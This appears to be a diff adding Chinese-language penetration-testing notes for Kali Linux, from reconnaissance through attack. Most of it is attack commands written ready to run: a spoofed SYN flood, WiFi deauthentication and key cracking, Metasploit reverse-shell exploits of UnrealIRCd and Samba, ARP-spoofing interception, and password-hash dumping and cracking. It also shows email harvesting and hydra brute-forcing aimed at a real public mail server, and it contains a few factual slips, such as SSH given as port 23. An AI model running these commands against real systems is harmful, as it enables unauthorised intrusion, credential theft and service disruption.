@@ -1,0 +1,864 @@
+startx    :命令行进入图形化界面
+
+网络基本命令
+（1）ifconfig /ifconfig -a：查看接口/网卡
+（2）ifconfig eth0 up   ：激活网卡（eth0网卡名称）
+（3）手动配置网卡
+配置IP地址：ifconfig eth0 192.168.1.100 netmask 255.255.255.0
+配置网关：route add default gw 192.168.1.1 （gw：gateway，网关）
+（4）配置DNS服务器地址
+配置文件在/etc/resolv.conf   nameserver后就是DNS服务器地址
+
+
+升级命令
+apt-get update：系统更新使用
+
+安装程序
+apt-get install 程序名称
+
+更新程序
+apt-get upgrade
+
+修改账户密码
+passwd 用户名
+
+用户列表和密码保存在/etc/passwd   /etc/shadow中
+
+常用命令
+ls -lh：列出文件
+cd    ：切换目录
+paw   ：查看当前工作目录
+rm    ：删除文件
+history：查看历史命令
+
+
+配置SSH（secure shell，23）服务
+SSH是在应用层和传输层基础上的安全协议（FTP，pop，Telnet是不安全的，以明文进行传输，容易受到man-in-the-middle，中间人攻击）
+远程登录会话的协议，对数据进行加密，防止DNS欺骗和IP欺骗，传输数据是经过压缩的，传输速度快（代替Telnet，为FTP，pop，PPP提供安全通道）
+目前所有SSH2版本，SSH1算法不安全
+启动/停止/状态服务：service ssh start|stop|status
+
+TFTP（简单文件传输协议，trivial file transfer protocol，69）
+使用UDP进行传输。TFTP只能从远程服务器上渡，写文件或读写文件传送给服务器。不能列出目录和不支持用户认证
+上传/下载文件：（Windows XP）tftp -i 服务器IP地址 put/get filename
+
+配置VNC服务
+VNC（virtual network computing，5901），使用RFB协议的桌面分享及远程控制类软件。
+VNC由VNC server和VNC viewer组成。
+
+信息收集
+（1）DNS信息收集
+1.DNSWalk：工具原理：基于DNS区域传输技术。可以获取DNS的A记录和CNAME记录等
+usage： dnswalk baidu.com.
+A记录：域名---IP地址的映射
+2.DNSTracer：dns检测工具，可以判断DNS服务器从哪里获得权威且有效的DNS记录。
+ dnstracer -v baidu.com
+3.DNSEnum:尽可能收集一个域的信息，它可以查询网站的主机地址信息、域名服务器、mx record（函件交换记录），在域名服务器上执行axfr请求，
+dnsenum --enum baidu.com
+（2）路径收集
+Windows：
+tracert www.baidu.com
+
+Linux：
+1.tcptracerroute:基于tcp数据包的路径跟踪工具。（现在防火墙把ICMP和UDP包的数据过滤掉，会出现*）
+通过发送tcp SYN数据包通过防火墙到达指定端口，可以穿透大多数防火墙。
+tcptraceroute www.baidu.com
+2.traceroute IP地址/域名
+3.0trace：建立完整tcp连接列出连接上的每一跳情况。
+usage：
+（1）建立一条tcp连接：Telnet www.baidu.com 80
+（2）0trace eth0 www.baidu.com 80 
+（3）通过HTTP激活tcp连接：浏览器访问百度/wget www.baidu.com,随时刷新
+
+（3）存活主机探测
+1.netenum：是IRPAS套件中的一部分，是nmap，supperscan的一个模块。使用ICMP测试存活主机的模块
+netenum <destination> [timeout] [verbosity]
+timeout：C（5秒），B（1分钟）
+
+2.nmap -sP 192.168.1.0/24
+
+（4）IP协议扫描工具
+protos，IP协议扫描工具，扫描所有可能支持的IP协议，通过目标不支持协议返回的ICMP不可达信息判断目标不支持协议类型。
+计算判断目标是否支持IP协议。
+Usage: ./protos -i eth0 -d 10.1.2.3 -v
+protos -i eth0 -d 192.168.1.105 v
+
+
+（5）信息挖掘工具
+SEAT（search engine assessment tools），综合多个搜索引擎（Google，Yahoo，live，AOL等）
+
+
+
+（6）dradis：帮助使用者在渗透测试过程中更充分的共享信息和控制进度
+是一个独立的web应用程序，使用ruby开发，采用B/S架构。支持不同的客户访问模式（browser/command line/wxruby）
+
+
+
+扫描和OS识别
+（1）nmap
+1.主机状态
+nmap -sP 192.168.1.0/24
+2.端口扫描（-sT,-sS,-sF,-sN,-sU,-sX）
+nmap -sS -vv 192.168.1.100
+3.操作系统指纹识别
+nmap -O 192.168.1.100
+4.nmap的高级扫描功能
+（1）延时策略（-T{0-5，higher is faster}）    
+0：paranoid模式，避开IDS检测，速度极慢。每隔至少5分钟发送一个包
+1：数据包发送间隔15秒
+2：polite模式：0.4秒发送数据包 
+3：normal模式：默认模式
+4：aggressive模式：对每个主机扫描时间不超过5分钟，探测等待时间不超过15秒
+5：insane模式：每台主机超时限制75秒，每次探测等待0.秒
+nmap -sS -T 1 192.168.1.100
+（2）服务版本探测
+-sV:服务版本探测
+nmap -sV -vv 192.168.1.110 
+nmap -sV -vv -p 23 192.168.1.107
+（2）hping2/3
+是一个基于命令行的tcp/ip工具。可以自定义ICMP，UDP，tcp数据包。
+1.探测防火墙保护的网络或主机（基于ICMP不可达的返回信息，Cisco（13））
+hping3 -A -F -S -p 80 www.baidu.com
+hping3 -A -F -S 192.168.1.110
+2.发起SYN flood洪水攻击（针对Windows 2000是有效的，但是其他Windows效果不明显）
+hping3 -a 伪造ip -S 目标IP -p 445 -i u 1000
+-a 伪造IP：保护自己
+-S 目标IP：攻击目标IP
+-p 445:目标开启的端口
+-i u1000:-i uX ,发送时间间隔，X指微秒
+hping3 -a 192.168.1.106 -S 192.168.1.107 -p 443 -i u100
+3.发送指定签名数据包
+标识自己身份，web无服务，无系统环境等
+（1）变写签名内容
+创建文本，输入纯英文的字符
+（2）发送签名数据报文
+hping3 -2 -p 端口 目标IP -d 数据包大小 -E 签名文件
+hping3 -2 -p 445  192.168.1.106 -d 50 -E signature.sig
+（3）拦截及识别签名数据报文
+拥有IDS，wireshark，ethereal数据包捕获工具
+发送buffer overflow，virus等关键字数据包，干扰IDS，防火墙的正常判断
+
+（3）nbtscan
+是一个扫描Windows网络netbios信息的小工具。使用与局域网，显示IP，主机名，用户名称，MAC地址等
+收集内网的MAC地址，主机名
+nbtscan -v -s ：192.168.1.0/24
+nbtscan 192.168.1.0/24
+nbtscan -r 192.168.1.0/24
+
+
+fping
+ping命令增强版，可以发出语音提醒。ping多台主机
+（1）同时ping多台主机
+fping -a -f 文件名
+fping -a -f ip.txt
+（2）扫描某个地址段
+-g：扫描的IP地址段
+-s：显示最终扫描结果
+-n:按名称显示
+fping -asgn 192.168.1.0/24 > host.txt（存活的主机保存在host.txt里面）
+
+
+SSLscan
+探测基于SSL的服务（HTTPS），识别SSL加密强度，识别ssl支持的加密算法
+--ssl2：Only check SSLv2 ciphers
+--ssl3： Only check SSLv3 ciphers
+sslscan --ssl2 www.baidu.com
+
+
+zenmap
+nmap的图形界面版本
+intense scan：细化扫描
+ping scan：主机存活情况
+
+
+p0f
+远程操作系统识别工具，判断目标是否运行在防火墙之后。是否运行NAT
+识别FreeBSD，Linux还是不错的，对Windows7 2008 10无法识别，被动识别工具
+直接运行p0f进行识别
+
+
+xprobe2
+基于ICMP栈指纹特征探测操作系统类型的工具
+，被动操作系统识别工具，操作系统老就很准确
+-v：显示详细详细
+-f：显示路由路径
+xprobe2 -v -f 192.168.1.107
+
+
+AMAP
+主要用于操作系统识别，端口对于服务识别等
+-B         Just grab banners, do not send triggers
+触发程序（trigger）是一个预存程序（类型：update，insert，delete，instead of，after）
+（1）服务版本识别
+usage：amap -B IP port
+amap -B 192.168.1.107 443
+（2）banner进行详细探测
+  -b         Print ascii banner of responses
+  -v         显示详细详细
+  -d         Dump all responses
+usage：amap -v -b IP port
+ amap -vb 192.168.1.107 443
+
+
+一个example
+（1）内网探测网关设备开放端口
+nmap -sS 192.168.1.1
+（2）对端口服务进行识别和判断
+amap -vd 192.168.1.1 1900
+
+
+httprint
+web服务器指纹识别工具
+httprint -h www1.example.com -s signatures.txt
+
+
+reverseraider
+使用字典暴力拆解子域名的工具
+
+
+dmitry
+能够最大限度收集一个IP或域名的信息
+ -w	 Perform a whois lookup on the domain name of a host
+ -i	 Perform a whois lookup on the IP address of a host
+  -p	 Perform a TCP port scan on a host
+-f	 Perform a TCP port scan on a host showing output reporting filtered ports
+
+（1）IP地址信息收集
+dmitry -i 115.239.211.112
+（2）域名信息收集
+dmitry -w www.baidu.com
+（3）端口扫描
+dmitry -p -f www.baidu.com
+
+IKE-Scan
+识别VPN服务或设备
+进行ike-scan前需要进行端口和服务扫描
+（1）VPN加密强度测试
+usage：ike-scan --sport=0 -M IP
+（2）VPN操作系统或设备版本探测
+usage：kie-scan --sport=0 --showbackoff -M IP
+
+
+
+WiFi破解
+（1）开启监听模式
+airmon-ng start wlan0
+airmon-ng check kill   //使用该命令kill一些会影响接下来的操作的进程
+airmon-ng stop wlan0mon    //关闭监听模式
+（2）扫描
+airodump-ng wlan0mon
+
+BSSID(Basic Service SetIdentifier): AP 的MAC 地址。
+
+ESSID(The Extended Service Set Identifier): AP 的名称。
+
+PWR(Power): 信号强度。
+Beacons: AP发出的通告编号，每个接入点（AP）在最低速率（1M）时差不多每秒会发送10个左右的beacon，所以它们能在很远的地方就被发现
+
+#Data:当前数据传输量。
+
+#/s:过去10秒钟内每秒捕获数据分组的数量。
+
+CH(Channel): AP 所在的频道。
+MB: AP 的最大传输速度。MB=11 => 802.11b，MB=22 => 802.11b+， MB>22 => 802.11g。后面带.的表示短封包标头，处理速度快，更利于破解。
+
+ENC(Encryption): 使用的加密算法体系。
+CIPHER: 检测到的加密算法。#这个和ENC 的区别我确实不明白，有没有知道的朋友可以告诉我。
+
+AUTH(Authority): 认证方式。
+
+Elapsed: 用过的时间。
+
+
+（3）抓包
+airodump-ng --bssid MAC地址 -c 频道 -w crack wlan0mon   （直到抓到handshake包，出现WPA handshake）
+（4）DOS攻击
+aireplay-ng -0 10 -a BSSID -c STATION wlan0mon
+-0表示发起deauthentication攻击
+-a指定无线路由器BSSID
+-c指定强制断开的设备
+aireplay-ng -0 20 -a  48:7D:2E:3D:AD:3C -c  10:44:00:E3:A6:1A   wlan0mon
+（5）进行破解
+aircrack-ng -w 字典名称 test-*.cap(握手包名称)
+
+
+
+web应用扫描
+（1）nikto：用于评估 Web 应用的已知安全问题。
+-host：目标主机
+-port：目标端口
+-ssl：与目标服务器建立ssl/tls会话
+nikto -host 10.200.63.252
+
+（2）SSLScan扫描ssl/tls，支持加密协议，证书等信息
+ssl 10.200.63.252
+
+
+配置ProxyChains
+添加代理，实现攻击者与受害者之间的直接连接
+配置文件 /etc/proxychains.conf
+将#dynamic_chain修改成dynamic_chain
+
+
+WPScan 是个黑盒的 WordPress 安全扫描器，允许用户发现 WordPress 上的漏洞。
+-u <目标域名或 url>：参数u允许你指定目标的域名。
+-f：参数f允许你强制检查WordPress是否安装。
+-e[选项]：参数e允许你设置枚举。
+wpscan –u 192.168.56.102
+
+命令枚举用户名列表：
+wpscan –u 192.186.56.102 –e u vp
+
+使用–wordlist <文件路径>选项来提供单词列表：
+wpscan –u 192.168.56.102 -e u --wordlist /root/wordlist.txt
+
+
+snmpwalk
+snmpwalk来检测Windows主机。Snmpwalk是一个使用SNMP GETNEXT请求在网络实体中查询信息树的SNMP应用
+snmpwalk -c public 192.168.10.200 -v 2c
+
+每局安装软件
+snmpwalk -c public 192.168.10.200 -v 1 | grep  hrSWInstalledName
+
+netmask icmp netmask请求
+-s：输出IP地址和子网掩码
+ netmask -s baidu.com
+
+WEP破解
+（1）查看无线网络接口
+airmon-ng
+（2）停止接口
+airmon-ng stop
+ifconfig wlan0 down
+（3）修改MAC地址（00:0f:00:38:c5:3f ）
+macchanger --mac 00:11:22:33:44:55 wlan0
+（4）开启接口监听模式/关闭一下影响airmon-ng的进程
+airmon-ng check kill
+airmon-ng start wlan0
+（5）扫描周围无线网络
+airodump-ng wlan0mon
+记录下BSSID和CH
+（6）抓包
+ariodump-ng --bssid BSSID -c CH -w wireless-crack wlan0mon
+（7）发送信息给路由器
+组合命令：
+为了尝试组合它们，我们运行aireplay。它拥有下列语法：aireplay-ng -1 0 –a [BSSID] –h [our chosen MAC address] –e [ESSID] [Interface]。
+Aireplay-ng --deauth 1 –a 09:AC:90:AB:78 –c 00:11:22:33:44:55 wlan0
+
+aireplay-ng -3 –b [BSSID] – h [Our chosen MAC address] [Interface]
+aireplay-ng -3 –b 09:AC:90:AB:78 –h 00:11:22:33:44:55 wlan0
+（8）破解
+aircrack-ng -b BSSID  wireless-crack.cap
+aircrack-ng –b 09:AC:90:AB:78 wirelessattack.cap
+破解WPA
+WPA（无线保护访问）
+aircrack-ng -w password-file wireless-creak
+
+
+攻击主机
+（1）网络扫描和嗅探工具-----nmap
+-sS：tcp syn扫描
+-Pn：不进行ping扫描
+-A：识别主机服务及版本
+nmap扫描类型
+1.ping扫描（探测主机是否在线）
+nmap -sP 192.168.1.0/24
+2.端口扫描（开发端口）
+nmap -sS 192.168.1.2
+3.服务探测
+nmap -sV 192.168.1.2
+nmap -A 192.168.1.2
+4.UDP扫描
+nmap -sU 192.168.1.3
+
+常用命令
+nmap -sS -Pn -A 192.168.1.100
+
+（2）使用msfconsole进行攻击检测到的服务（6667/tcp open  irc    Unreal ircd）
+1.启动msf
+root@kali:~# msfconsole 
+2.查询服务可利用模块
+msf > search Unreal
+3.查看可利用模块的详细信息（ exploit/unix/irc/unreal_ircd_3281_backdoor ）
+msf > info exploit/unix/irc/unreal_ircd_3281_backdoor 
+4.使用模块
+msf > use exploit/unix/irc/unreal_ircd_3281_backdoor 
+5.查看模块可配置的选项
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show options 
+6.配置参数
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 192.168.1.112
+7.查看可利用的攻击载荷
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads 
+攻击载荷全是 Unix Command Shell：命令行shell，就不能使用meterpreter shell,只能使用反向shell
+8.使用反向shell，并查看可配置选项
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show options 
+9.配置攻击载荷参数
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.1.109
+10.启动渗透攻击
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit 
+看到一个闪烁的光标，表示连接到目标主机的一个终端shell，可以执行任何标准的Linux命令
+（1）查看当前的登录用户
+whoami
+（2）查看系统的密码文件
+cat /etc/passwd
+
+在metasploit中扫描（服务版本）
+1.启动msf
+root@kali:~# msfconsole 
+2.搜索可用的扫描模块
+msf > search scanner
+3.搜索指定服务扫描模块
+msf > search scanner/ssh
+4.使用版本模块扫描ssh,并查看可配置选项
+msf > use auxiliary/scanner/ssh/ssh_version 
+msf auxiliary(scanner/ssh/ssh_version) > show options 
+5.设置模块参数
+msf auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.112
+6.启动扫描
+msf auxiliary(scanner/ssh/ssh_version) > exploit 
+
+扫描Telnet
+（1）msf > search scanner/telnet
+Matching Modules
+================
+
+   Name                                                Disclosure Date  Rank    Description
+   ----                                                ---------------  ----    -----------
+   auxiliary/scanner/telnet/brocade_enable_login                        normal  Brocade Enable Login Check Scanner
+   auxiliary/scanner/telnet/lantronix_telnet_password                   normal  Lantronix Telnet Password Recovery
+   auxiliary/scanner/telnet/lantronix_telnet_version                    normal  Lantronix Telnet Service Banner Detection
+   auxiliary/scanner/telnet/satel_cmd_exec             2017-04-07       normal  Satel Iberia SenNet Data Logger and Electricity Meters Command Injection Vulnerability
+   auxiliary/scanner/telnet/telnet_encrypt_overflow                     normal  Telnet Service Encryption Key ID Overflow Detection
+   auxiliary/scanner/telnet/telnet_login                                normal  Telnet Login Check Scanner
+   auxiliary/scanner/telnet/telnet_ruggedcom                            normal  RuggedCom Telnet Password Generator
+   auxiliary/scanner/telnet/telnet_version                              normal  Telnet Service Banner Detection
+
+（2）msf > use auxiliary/scanner/telnet/telnet_version 
+msf auxiliary(scanner/telnet/telnet_version) > show options 
+
+Module options (auxiliary/scanner/telnet/telnet_version):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     23               yes       The target port (TCP)
+   THREADS   1                yes       The number of concurrent threads
+   TIMEOUT   30               yes       Timeout for the Telnet probe
+   USERNAME                   no        The username to authenticate as
+
+（3）msf auxiliary(scanner/telnet/telnet_version) > set RHOSTS 192.168.1.112
+RHOSTS => 192.168.1.112
+（4）msf auxiliary(scanner/telnet/telnet_version) > exploit 
+
+[+] 192.168.1.112:23      - 192.168.1.112:23 TELNET Login with msfadmin/msfadmin to get started\x0a\x0a\x0ametasploitable login:
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+得到登录密码和用户名：msfadmin/msfadmin
+（5）登录目标主机Telnet服务
+root@kali:~# telnet 192.168.1.112
+root@kali:~# telnet -l msfadmin 192.168.1.112
+查看多个组成员
+msfadmin@metasploitable:~$ id
+
+扫描单个Samba服务器
+（1）msf > search scanner/smb
+（2）msf > use auxiliary/scanner/smb/smb_version 
+     msf auxiliary(scanner/smb/smb_version) > show options 
+（3）msf auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.112
+RHOSTS => 192.168.1.112
+（4）msf auxiliary(scanner/smb/smb_version) > exploit 
+
+扫描一个网络中的Samba服务器
+（1）msf > search scanner/smb
+（2）msf > use auxiliary/scanner/smb/smb_version 
+     msf auxiliary(scanner/smb/smb_version) > show options 
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS     192.168.1.112    yes       The target address range or CIDR identifier
+   SMBDomain  .                no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads
+
+（3）msf auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
+RHOSTS => 192.168.1.0/24
+msf auxiliary(scanner/smb/smb_version) > set THREADS 255   //设置扫描线程
+THREADS => 255
+（4）msf auxiliary(scanner/smb/smb_version) > exploit 
+（5）渗透攻击Samba服务器
+1.搜索usernap模块
+msf > search samba/usermap
+   exploit/multi/samba/usermap_script  2007-05-14       excellent  Samba "username map script" Command Execution
+2.查看模块的详细信息
+msf > info exploit/multi/samba/usermap_script 
+3.使用模块
+msf > use exploit/multi/samba/usermap_script 
+msf exploit(multi/samba/usermap_script) > show options 
+4.设置模块参数
+msf exploit(multi/samba/usermap_script) > set RHOST 192.168.1.102
+RHOST => 192.168.1.102
+5.进行渗透攻击
+msf exploit(multi/samba/usermap_script) > exploit 
+
+
+
+免杀payload生成工具---------veil
+（1）安装veil
+root@kali:~# apt-get update && apt-get install veil
+（2）启动veil
+root@kali:~# veil-evasion
+
+
+
+捕获和监视网络数据
+中间人攻击进行截获目标主机和路由器之间的数据。
+中间人攻击两个阶段
+（1）攻击一台主机（ARP注入攻击实现ARP欺骗，工具：arpspoof）
+开启路由转发功能：root@kali:~# echo 1 >/proc/sys/net/ipv4/ip_forward 
+ARP欺骗：root@kali:~# arpspoof -i eth0 -t 192.168.1.108 192.168.1.1
+（2）欺进行转发和查看目标主机信息
+查看目标主机访问URL信息：root@kali:~# urlsnarf -i eth0 
+捕获目标主机的图片信息：root@kali:~# driftnet -i eth0
+
+
+渗透测试
+（1）基本配置
+网络设置配置文件/etc/network/interfaces
+uto lo
+iface lo inet loopback  默认使用DHCP获取IP地址
+
+固定IP地址配置
+auto eth0
+iface eth0 inet static
+address 192.168.1.22
+netmask 255.255.255.0
+network 192.168.1.0
+broadcast 192.168.1.255
+gateway 192.168.1.1
+
+
+启用网络
+service networking start/stop
+
+
+更新源文件
+/etc/apt/sources.list
+apt-get update：同步软件索引包
+apt-get upgrade：更新人软件包
+apt-get dist-upgrade：升级系统
+
+kali的常见网络访服务
+HTTP服务
+启动服务：service apache2 start（apache2 {start|stop|graceful-stop|restart|reload|force-reload}）
+主义文件：/var/www/html/index.html
+
+mysql服务
+启动： service mysql start
+登录mysql服务器：mysql -u root -p（无密码登录，默认只能本机访问mysql）
+配置文件：/etc/mysql/mysql.cnf
+
+ssh服务
+启动：service ssh  start/status
+
+
+安装额外工具包
+apt-cache search Nessus：查找软件包
+apt-cache show software-name：显示软件包名称
+apt-get install software-name：安装软件
+
+
+root@kali:~# ifconfig | egrep "HWaddr|inet add"
+root@kali:~# route | grep default
+root@kali:~# route | egrep "Dest|192.168"
+
+查看路由表：
+root@kali:~# netstat -rn
+root@kali:~# route
+
+wireshark抓包
+1.wireshark
+2.tcpdump
+tcpdump -i eth0 -w Desktop/tcpdump.cap
+
+tcpdump -i eth0 host 192.168.1.1  -w Desktop/tcpdump.cap
+
+
+查看操作系统所有版本信息
+root@kali:~# lsb_release -a
+No LSB modules are available.                #无效的LSB模块
+Distributor ID:	Kali                         
+Description:	Kali GNU/Linux Rolling       #描述信息
+Release:	kali-rolling                 #版本信息
+Codename:	kali-rolling                 #代号
+
+查看版本号
+root@kali:~# cat /etc/issue
+Kali GNU/Linux Rolling \n \l
+
+查看内核信息：uname -a
+
+查看端口是否被监听
+netstat -tpan | grep apache
+
+准备内核头文件
+apt-get install linux-headers- `uname -r`
+
+攻击WordPress
+
+
+哈希值识别工具：
+hash-identifier 
+
+
+破解LM Hashes密码
+格式：findmyhash <Encryption> -h hash
+root@kali:~# findmyhash MD5 -h 5f4dcc3b5aa765d61d8327deb882cf99
+5f4dcc3b5aa765d61d8327deb882cf99 -> password
+
+获取目标主机上所有用户的哈希密码值
+meterpreter > run post/windows/gather/hashdump
+
+
+ 破解Windows用户密码
+Windows系统的用户名和密码保存在SAM（安全账号管理器）文件中。在基于NT内核的Windows系统中，
+包括Windows 2000及后续版本，这个文件保存在“C:\Windows\System32\Config”目录下
+ 第一个地方：C:\WINDOWS\repair\SAM
+ 第二个地方：C:\WINDOWS\system32\config\SAM
+ 第一个地方的SAM，是帐户数据库的备份文件；第二地方的SAM，是系统正在使用的帐户数据库文件。
+获取系统控制权后
+使用SamDump2提取SAM文件：samdump2 SAM system > /root/hash.txt
+运行john命令，实现密码攻击：/john /root/hash.txt --format=nt
+
+
+破解Linux用户密码
+使用unshadow提取密码散列：
+root@kali:~# unshadow /etc/passwd /etc/shadow > /root/Desktop/passwd.txt
+破解密码
+root@kali:~# john --format=crypt --show /root/Desktop/passwd.txt 
+
+arpspoof
+(1)URL流量操纵攻击
+开启流量转发：echo 1 >/proc/sys/net/ipv4/ip_forward
+攻击目标系统：arpspoof -i eth0 -t 10.200.57.75 10.200.63.254
+攻击网关：arpspoof -i eth0 -t 10.200.63.254 10.200.57.75
+（2）端口重定向
+开启流量转发：echo 1 >/proc/sys/net/ipv4/ip_forward
+注入流量到默认网络：arpspoof -i eth0 10.200.63.254
+添加端口重定向规则：iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+（3）监视无线网络数据
+开启流量转发：echo 1 >/proc/sys/net/ipv4/ip_forward
+攻击目标系统：arpspoof -i eth0 -t 10.200.57.75 10.200.63.254
+查看主机访问URL地址：urlsnarf -i eth0
+查看访问图片：driftnet -i eth0
+
+
+配置IP地址
+/etc/network/interfaces
+固定IP地址：
+auto eth0
+iface eth0 inet static
+address 10.0.2.15
+netmask 255.255.255.0
+network 10.0.2.0
+broadcast 10.0.2.255
+gateway 10.0.2.2
+
+指定所有网卡都通过DHCP获取IP地址
+auto lo
+iface lo inet loopback
+
+
+启用/关闭网络
+service networking start/stop
+
+自动启动网络连接服务：
+update-rc.d networking defaults
+
+更新源文件：
+/etc/apt/sources.list
+apt-get update：同步软件（安装软件或安装系统更新）
+apt-get upgrade：升级系统上安装的所有软件包
+apt-get dist-upgrade：升级系统
+
+Kali Linux的网络服务
+HTTP已经集成（apache2）：service apache2 stop|start   启动|关闭
+计算机在启动时自动启动Apache HTTP服务：
+update-rc.d apache2 defaults
+
+MySQL
+mysql –u root -p  访问mysql
+系统在启动过程中自动启动MySQL 服务
+update-rc.d mysql defaults
+
+SSH
+update-rc.d ssh defaults
+
+
+在软件仓库中查找某个软件包的名称，可使用指令：
+apt-cache search <软件包名称>
+查看软件包的详细信息（描述信息、软件包大小和版本等信息），可使用命令：
+apt-cache show <软件包名称>
+apt-get 命令安装该软件包。apt-get指令的基本用法是：
+apt-get install <软件包名称>
+
+
+通过源代码安装软件的方法大体都可归纳为下述几个步骤。
+1．使用压缩包管理软件（例如Tar和7-Zip）解压缩软件包。
+2．进入到解压缩文件所在的目录。
+3．执行指令：
+./configure
+make
+make install
+
+dns配置文件
+/etc/resolv.conf
+
+信息收集
+信息收集的方法可归为两类：主动式信息收集和被动式信息收集。
+主动式收集方法是通过直接发起与被测目标网络之间的互动来获取相关信息。例如，ICMP ping 或者 TCP 端口扫描就属于主动式信息收集手段。
+而被动信息收集方法，则是通过第三方服务来获取目标网络的相关信息，例如使用谷歌搜索引擎等。
+信息收集方式：
+通过公开网站收集目标域的有关信息；
+1.收集域的注册信息：
+网站或whois example.com
+2.DNS 分析：
+（1）查询服务器IP地址：host www.example.com（host -a www.baidu.com）
+通过查询域名的IP信息，这种查询叫做正向查询（forward lookup）。而通过IP 地址查询域名，这种查询叫做逆向查询（reverse lookup）
+host 程序还可以进行DNS 域传输（zone transfer）。域传输的结果包含某一域里所有的主机名称
+（2）dig指令进行DNS查询
+dig example.com any  查询全部dns数据
+（3）dnsenum程序收集DNS数据（Kali Linux 收录的dnsenum 自带有字典文件（dns.txt），该字典可测试1480个子域名。此外另有可测试266930个子域名的字典文件dns-big.txt）
+dnsenum example.com
+dnsenum -f dns.txt example.com   进行暴力破解子域名
+收集路由信息：
+（1）tcptraceroute
+tcptraceroute www.example.com
+（2）traceroute
+traceroute www.example.com
+（3）tctrace
+tctrace -i eth0 -d www.example.com
+利用搜索引擎：
+（1）theharvester能够收集电子邮件账号、用户名和主机名/子域名信息。它通过数个公共资源搜索所需的信息
+如果想从谷歌的前 100 项搜索结果里挖掘目标域里的电子邮件地址和主机名，可使用下述指令。
+theharvester -d example.com -l 100 -b google
+如果需要收集其他信息，例如用户名等信息，我们可以指定程序使用linkedin.com。具体指令如下。
+theharvester -d example.com -l 100 -b linkedin
+（2）Metagoofil通过谷歌引擎搜索目标域的文件的元数据信息（metadata）
+要从目标域（-d example.com）里搜索DOC 文件和PDF 文件（-t .doc, .ipdf），并保存到test 目录里（-o test）。对于每种类型的文件，我们都要收集 20 个（-l 20）。我们希望这个程序只下载 5 个文件（-n 5），并将最终处理结果保存为test.html（-f test.html）。结合以上参数，我们应当使用的指令如下。
+metagoofil -d example.com -l 20 -t doc,pdf –n 5 -f test.html -o test
+dnsdict6：枚举IPv6的子域名
+dnsdict6 example.com
+
+fierce可通过多项技术查找目标的IP地址和主机名
+fierce查找某个域的有关信息。
+fierce -dns example.com -threads 3
+
+
+目标识别
+（1） 识别目标主机
+ping：ping ip-address
+
+ping6：ping6 -c 1 fe80::a00:27ff:fe43:1518 -I eth0（目标主机使用的是 IPv6 地址）
+
+arping：arping ip-address|mac-address（检测主机是否在线）
+        arping -c count-packet -I interface -D ip-address（判断IP地址是否被占用（1：占用；0：没有占用））
+
+fping：fping 192.168.1.1 192.168.1.101 192.168.1.200（对个地址）
+       fping -g 192.168.1.0/24（一个网段）
+       fping -s 192.168.1.1 192.168.1.100 192.168.1.200（统计输出）
+
+hping3：hping3 -1 192.168.1.106 -c 2   发送一个ICMP协议echo请求
+        
+
+nping：
+
+nbtscan：
+http://www.hackdig.com/
+
+httrack:网站克隆工具
+离线网站下载程序（http://www.httrack.com/page/2/en/index.html  ）
+
+
+数据收集之狂扫E-Mail用户
+使用工具：      
+1.Theharvester
+   - f:将结果保存到一个HTML和XML文件　　
+ -n:对发现的所有范围执行反向DNS查询　　
+ -c:执行一个DNS域名的蛮力　　
+ - t:执行一个DNS TLD扩张　     
+-e:使用该DNS服务器　　 
+- l:限制结果的数量与(bing从50 - 50的结果,　　
+ -h:使用SHODAN数据库查询发现主机　　 
+-d: 指定一个域名
+-b: 指定一个搜索引擎　    
+-v:验证通过dns解析主机名和寻找虚拟主机
+theharvester -d 域名 -l 线程 -b 引擎 -f 保存路径
+2.Metasploit    
+msf > use auxiliary/gather/search_email_collector_baidu   
+msf auxiliary(gather/search_email_collector_baidu) > set domain qq.com
+domain => qq.com
+msf auxiliary(gather/search_email_collector_baidu) > set OUTFILE /root/Desktop/qq.txt
+OUTFILE => /root/Desktop/qq.txt
+msf auxiliary(gather/search_email_collector_baidu) > set PAGENUMBER 60
+PAGENUMBER => 60
+msf auxiliary(gather/search_email_collector_baidu) > exploit 
+
+pop3服务器：pop.qq.com（110）
+smtp服务器：smtp.qq.com（25）
+pop3和SMTP采用ssl加密，pop3端口（995），SMTP端口（465,587）
+暴力工具：hydra -L 用户名字典 -P 密码字典 -o /root/ok.txt -s 465 smtp.qq.com smtp
+hydra -L /root/Desktop/qq.txt -P /root/Desktop/wordlist.txt -e ns -o /root/Desktop/ok.txt -s 465 smtp.qq.com smtp -V
+
+
+暴力破解ftp
+字典生成工具：crunch 4 7 123456789 -o /root/mima.txt
+hydra -l admin -p 123456 192.168.253.1 ftp -vV
+
+access注入
+sqlmap -u "url" --dbs ：所有数据库
+sqlmap -u "url" --tables:猜表名
+sqlmap -u "url" --columns -T 表名   ：猜字段
+sqlmap -u "url" --dump -C 列名 -T 表名：爆破数据
+
+mysql注入（http://nxzz.com/）
+sqlmap -u "url" --dbs ：所有数据库
+sqlmap -u "url" --current-db:当前使用数据库
+sqlmap -u "url" --is-dba：查看用户权限
+sqlmap -u "url" --current-user：查看当前使用数据库用户
+sqlmap -u "url" --users：所有用户
+sqlmap -u "url" -D“当前数据库”--tables：猜表名
+sqlmap -u "url" -D “当前数据库” -T “表名”--columns  ：列字段
+sqlmap -u "url" -D “当前数据库” -T “表名” -C “字段名” --dump：爆破字段数据
+
+sqlmap的tamper插件
+1.tamper：用于绕过一些防火墙（WAF，IPS，IDS）
+2.命令
+--tamper “脚本名称”//使用脚本需要3个等级以上
